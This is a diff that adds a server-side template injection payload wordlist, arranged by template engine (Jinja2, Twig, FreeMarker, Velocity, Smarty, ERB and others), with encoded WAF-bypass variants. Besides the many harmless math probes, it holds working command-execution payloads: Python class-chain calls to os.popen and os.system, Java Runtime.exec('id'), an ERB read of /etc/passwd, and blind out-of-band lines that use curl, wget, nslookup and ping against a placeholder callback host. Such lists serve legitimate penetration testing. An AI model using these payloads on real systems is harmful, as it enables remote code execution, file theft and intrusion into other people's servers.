@@ -1,0 +1,346 @@
+# ==================== BASIC MATH DETECTION ====================
+{{7*7}}
+${7*7}
+${{7*7}}
+{{7*'7'}}
+#{7*7}
+*{7*7}
+{7*7}
+<${{7*7}}>
+{{7*7}}}
+{{7*7}}]
+{{7*7}}"
+{{7*7}}'
+${7*7}
+${{7*7}}
+#{7*7}
+{{7*7}}
+*{7*7}
+{7*7}
+{{7*7}}
+<%= 7*7 %>
+{{7*7}}
+{{7*7}}
+{{7*7}}
+
+# ==================== ADVANCED MATH BYPASS ====================
+{{7*7}}00
+{{7*7}}%00
+{{7*7}}%0a
+{{7*7}}%0d
+{{7*7}}%09
+{{7*7}}%20
+{{7*7}}#
+{{7*7}}//
+{{7*7}}/*{{7*7}}*/
+${7*7}00
+${7*7}%00
+${{7*7}}00
+${{7*7}}%0a
+#{7*7}00
+<%= 7*7 %>00
+
+# ==================== IDENTIFICATION PAYLOADS ====================
+{{config}}
+{{self}}
+{{_self}}
+${.vars}
+{{app.request.server.all}}
+{$smarty.version}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{config.__class__.__init__.__globals__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+${"freemarker.template.utility.Execute"?new()}
+#set($x=$class.inspect("java.lang.Runtime"))
+{{dump(app)}}
+{{=7*7}}
+{{=7*7}}
+{=7*7}
+{{7*7}}
+{{7*7}}
+
+# ==================== JINJA2 DETECTION ====================
+{{7*7}}
+{{config}}
+{{self}}
+{{''.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+{{request.application.__globals__}}
+{{cycler.__init__.__globals__}}
+{{joiner.__init__.__globals__}}
+{{namespace.__init__.__globals__}}
+{{lipsum.__globals__}}
+{{range.__globals__}}
+{{dict.__globals__}}
+{{config.items()}}
+{{config.__class__.__init__}}
+{{config.__class__.__dict__}}
+{{''.__class__.__bases__}}
+{{''.__class__.__base__}}
+
+# ==================== TWIG DETECTION ====================
+{{7*7}}
+{{_self}}
+{{_self.env}}
+{{_self.env.registerUndefinedFilterCallback}}
+{{_self.env.getFilter}}
+{{_self.env.setLoader}}
+{{_context}}
+{{app.request.server.all}}
+{{constant('_self')}}
+{{dump(app)}}
+{{var_dump(app)}}
+
+# ==================== FREEMARKER DETECTION ====================
+${7*7}
+${.vars}
+${.data_model}
+${.main}
+${.version}
+${.current_template_name}
+${.output_encoding}
+${.locale}
+${.time_zone}
+${.url_escaping_charset}
+${.template_language}
+${.template_name}
+${.node}
+${.node_name}
+${.node_type}
+${.node_namespace}
+${"freemarker.template.utility.Execute"?new()}
+
+# ==================== VELOCITY DETECTION ====================
+#set($x=7*7)${x}
+#set($x=$x.class)
+#set($x=$x.forName("java.lang.Runtime"))
+#set($x=$x.getRuntime())
+#set($x=$x.exec("id"))
+${x}
+#set($str=$class.inspect("java.lang.String"))
+#set($ex=$str.valueOf($class.inspect("java.lang.Runtime").getRuntime().exec("id")))
+
+# ==================== SMARTER DETECTION ====================
+{$smarty.now}
+{$smarty.version}
+{$smarty.const}
+{$smarty.config}
+{$smarty.ldelim}
+{$smarty.rdelim}
+{php}phpinfo();{/php}
+{literal}system('id'){/literal}
+{include file="input"}
+
+# ==================== ERB (RUBY) DETECTION ====================
+<%= 7*7 %>
+<%= system("id") %>
+<%= `id` %>
+<%= File.open('/etc/passwd').read %>
+<%= ENV['PATH'] %>
+<%= request.env %>
+<%= @user.name %>
+<%= user.name %>
+
+# ==================== JADE/PUG DETECTION ====================
+#{7*7}
+#{7*7}
+#{function(){return 7*7}()}
+#{{7*7}}
+#{7*7}00
+
+# ==================== HANDLEBARS DETECTION ====================
+{{7*7}}
+{{7*7}}
+{{{7*7}}}
+{{> 7*7}}
+{{> (7*7)}}
+{{#> 7*7}}
+{{! 7*7}}
+
+# ==================== DOT (C#) DETECTION ====================
+@(7*7)
+@(7*7)
+@{7*7}
+@{
+    var x = 7*7;
+    @x
+}
+@if(7*7==49){@true}
+
+# ==================== BLIND SSTI TIME DELAY ====================
+{{7*7}}
+{{sleep(5)}}
+{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test','w').write('test')}}
+{{self.__init__.__globals__.os.system('sleep 5')}}
+{{url_for.__globals__.os.system('sleep 5')}}
+{{get_flashed_messages.__globals__.os.system('sleep 5')}}
+{{cycler.__init__.__globals__.os.system('sleep 5')}}
+{{joiner.__init__.__globals__.os.system('sleep 5')}}
+
+# ==================== BLIND SSTI DNS CALLBACK ====================
+{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('|nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+{{self.__init__.__globals__.os.popen('ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net')}}
+{{url_for.__globals__.os.system('curl http://YOUR-COLLABORATOR.burpcollaborator.net')}}
+{{cycler.__init__.__globals__.os.popen('wget http://YOUR-COLLABORATOR.burpcollaborator.net')}}
+
+# ==================== WAF BYPASS ENCODED ====================
+%7B%7B7%2A7%7D%7D
+%24%7B7%2A7%7D
+%7B%7Bconfig%7D%7D
+%7B%7Bself%7D%7D
+%7B%7B''.__class__.__mro__%5B2%5D.__subclasses__()%7D%7D
+%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('id').read()%7D%7D
+%7B%7B7*7%7D%7D%00
+%7B%7B7*7%7D%7D%0a
+%7B%7B7*7%7D%7D%09
+%7B%7B7*7%7D%7D%20
+%7B%7B7*7%7D%7D%23
+
+# ==================== DOUBLE ENCODED BYPASS ====================
+%257B%257B7%252A7%257D%257D
+%2524%257B7%252A7%257D
+%257B%257Bconfig%257D%257D
+%257B%257Bself%257D%257D
+%257B%257B''.__class__.__mro__%255B2%255D.__subclasses__()%257D%257D
+
+# ==================== COMMENT BYPASS ====================
+{{/*7*7*/}}
+{{#7*7#}}
+{{# 7*7 #}}
+{{!-- 7*7 --}}
+{{/* 7*7 */}}
+{{=7*7=}}
+{{!7*7}}
+{{7*7<!-- -->}}
+{{7*7<!---->}}
+{{7*7<#-- -->}}
+
+# ==================== WHITESPACE BYPASS ====================
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+
+# ==================== NEWLINE BYPASS ====================
+{%
+7*7
+%}
+{{
+7*7
+}}
+<%
+7*7
+%>
+<%
+=7*7
+%>
+{{
+=7*7
+}}
+
+# ==================== CASE VARIATION BYPASS ====================
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+
+# ==================== HTML ENTITY BYPASS ====================
+&#123;&#123;7*7&#125;&#125;
+&#x7B;&#x7B;7*7&#x7D;&#x7D;
+&#123;&#123;config&#125;&#125;
+&#x7B;&#x7B;self&#x7D;&#x7D;
+&#123;&#123;''.__class__&#125;&#125;
+
+# ==================== URL PATH SSTI ====================
+/{{7*7}}
+/${7*7}
+/${{7*7}}
+/{{7*7}}/
+/{{7*7}}.html
+/{{7*7}}?x=y
+/prefix{{7*7}}suffix
+/{{7*7}}/admin
+/admin/{{7*7}}/edit
+/api/{{7*7}}/user
+
+# ==================== JSON PARAMETER SSTI ====================
+{"name":"{{7*7}}"}
+{"name":"${7*7}"}
+{"name":"${{7*7}}"}
+{"template":"{{7*7}}"}
+{"query":"{{7*7}}"}
+{"data":"<%= 7*7 %>"}
+
+# ==================== XML PARAMETER SSTI ====================
+<name>{{7*7}}</name>
+<name>${7*7}</name>
+<name>${{7*7}}</name>
+<template>{{7*7}}</template>
+<data><%= 7*7 %></data>
+
+# ==================== HEADER SSTI ====================
+X-Forwarded-For: {{7*7}}
+X-Forwarded-Host: {{7*7}}
+User-Agent: {{7*7}}
+Referer: {{7*7}}
+Cookie: name={{7*7}}
+Cookie: session={{7*7}}
+X-Custom-Header: {{7*7}}
+
+# ==================== MULTI-PARAMETER SSTI ====================
+?name={{7*7}}&email=test@test.com
+?user={{7*7}}&pass={{7*7}}
+?search={{7*7}}&page={{7*7}}
+?q={{7*7}}&sort={{7*7}}
+?template={{7*7}}&layout={{7*7}}
+
+# ==================== ADVANCED BYPASS (VARIABLE ASSIGNMENT) ====================
+{% set x=7*7 %}{{x}}
+{% with x=7*7 %}{{x}}{% endwith %}
+{% do x=7*7 %}{{x}}
+${(7*7)::()}
+${(7*7)?string}
+${(7*7)?c}
+${(7*7)?upper}
+${(7*7)?lower}
+{{(7*7)|safe}}
+{{(7*7)|escape}}
+{{(7*7)|default(49)}}
+{{(7*7)|length}}
+{{(7*7)|string}}
+{{(7*7)|int}}
+{{(7*7)|float}}
+
+# ==================== RAPID DETECTION (FULL SCAN) ====================
+{{7*7}}${7*7}${{7*7}}<%=7*7%>#{7*7}*{7*7}{7*7}{{7*7}}<%=7*7%><%7*7%><%=7*7%><%#7*7%><%7*7%><%7*7%><%7*7%><%=7*7%><%=7*7%><%=7*7%>
+
+# ==================== 2026 LATEST BYPASS ====================
+{{7*7}}?{{7*7}}
+{{7*7}}#{{7*7}}
+{{7*7}}&{{7*7}}
+{{7*7}}+{{7*7}}
+{{7*7}}/{{7*7}}
+{{7*7}}\{{7*7}}
+{{7*7}}|{{7*7}}
+{{7*7}}.{{7*7}}
+{{7*7}}:{{7*7}}
+{{7*7}};{{7*7}}
+{{7*7}},{{7*7}}
+{{7*7}}!{{7*7}}
+{{7*7}}?{{7*7}}
+{{7*7}}~{{7*7}}
